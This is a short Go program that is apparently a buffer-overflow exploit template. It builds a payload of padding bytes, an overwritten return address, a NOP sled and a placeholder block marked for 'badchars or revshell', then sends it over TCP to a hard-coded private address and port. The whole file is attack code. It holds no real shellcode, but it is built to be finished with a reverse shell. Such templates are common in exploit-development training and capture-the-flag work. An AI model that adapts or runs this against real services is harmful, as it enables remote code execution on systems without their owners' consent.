package main

import (
	"fmt"
	"net"
	"strings"
)

func main() {
	//define Target
	ip := "192.168.1.105" //change this
	port := "9185" //change this
	target := ip + ":" + port

	//Define Payload
	as := strings.Repeat("A", 279)
	eip := "\x77\x55\x42\x32" //address in reverse due to endien format
	nop := strings.Repeat("\x90", 16)
	shell := strings.Repeat("C", 400) //insert badchars or revshell here
	payload := as + eip + nop + shell + "\x00"

	fmt.Println(payload) //optional for debug

	//Establishing Connection
	conn, err := net.Dial("tcp", target)
	if err != nil {
		fmt.Println("Could not connect: ", err)
	}

	//Writing payload
	bytesWritten, err := conn.Write([]byte(payload))
	if err != nil {
		fmt.Println("Could not write the payload: ", err)
	}
	fmt.Println("Data Written: ", bytesWritten)

}
